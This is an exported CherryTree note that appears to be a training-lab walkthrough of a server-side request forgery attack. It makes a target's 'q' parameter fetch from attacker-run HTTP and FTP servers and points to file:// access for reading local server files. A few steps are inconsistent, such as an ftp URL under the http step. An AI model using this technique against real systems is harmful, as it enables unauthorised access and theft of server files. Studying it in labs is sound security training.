<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSRF against external systems</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SSRF against external systems</h1><br/><br />1. Request resource<br />    <div class="codebox"><pre> curl -i -s -L http://&lt;TARGET IP&gt;</pre></div><br />    <a href=""><img src="images/2561-1.png" alt="images/2561-1.png" /></a><br />    the q parameter could be vulnerable<br /><br />2. Ip address on the VPN<br />    <div class="codebox"><pre>ifconfig</pre></div><br />    <a href=""><img src="images/2561-2.png" alt="images/2561-2.png" /></a><br /><br /><br />3. Set up listener<br />    <a href=""><img src="images/2561-3.png" alt="images/2561-3.png" /></a><br /><br />4. Request our ip<br />    <a href=""><img src="images/2561-4.png" alt="images/2561-4.png" /></a><br />    From our listener we got<br />    <a href=""><img src="images/2561-5.png" alt="images/2561-5.png" /></a><br />    From the User-Agent we can see that the request is been issued by the target server using <a href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a><br /><br /><br />5. Reading the <a href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a> documentation, we can see it supports: http, ftp, file<br />    Create index.html file<br />       <div class="codebox"><pre>nano index.html</pre></div><br />       <a href=""><img src="images/2561-6.png" alt="images/2561-6.png" /></a><br />   1) http<br />      <div class="codebox"><pre>python3 -m http.server 9090<br />curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=ftp://&lt;VPN/TUN Adapter IP&gt;/index.html&quot;</pre></div><br />      <a href=""><img src="images/2561-7.png" alt="images/2561-7.png" /></a><br />      <a href=""><img src="images/2561-8.png" alt="images/2561-8.png" /></a><br />   2) ftp<br />      <div class="codebox"><pre>sudo pip3 install twisted<br />sudo python3 -m twisted ftp -p 21 -r .<br />curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=ftp://&lt;VPN/TUN Adapter IP&gt;/index.html&quot;</pre></div><br />      <a href=""><img src="images/2561-9.png" alt="images/2561-9.png" /></a><br />      <a href=""><img src="images/2561-10.png" alt="images/2561-10.png" /></a><br />   5) file (to retrieve Local Files)<br />      <a href=""><img src="images/2561-11.png" alt="images/2561-11.png" /></a></div>
</body>
</html>
